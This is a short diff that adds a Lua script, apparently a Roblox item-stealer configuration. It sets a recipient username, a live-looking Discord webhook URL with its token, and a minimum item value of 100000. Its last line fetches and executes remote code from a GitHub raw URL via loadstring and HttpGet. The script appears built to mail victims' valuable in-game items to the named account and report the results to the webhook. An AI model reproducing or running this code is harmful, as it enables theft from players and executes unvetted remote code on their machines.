@@ -1,0 +1,9 @@
+Username = "Solly_dft2423"
+Username2 = "Solly_dft2423"
+Webhook = "https://discord.com/api/webhooks/1199345927870218391/xbOY3KkXXtcy3Q1t7YkppleZLriFaG-gttqKg2tgNLWL9vZWkJzP9sUwuEAWVrXq5trR"
+
+LoadingScreen = false
+
+MinimumRAP = 100000
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/egorpomidor123/scripts/main/mailbox"))()
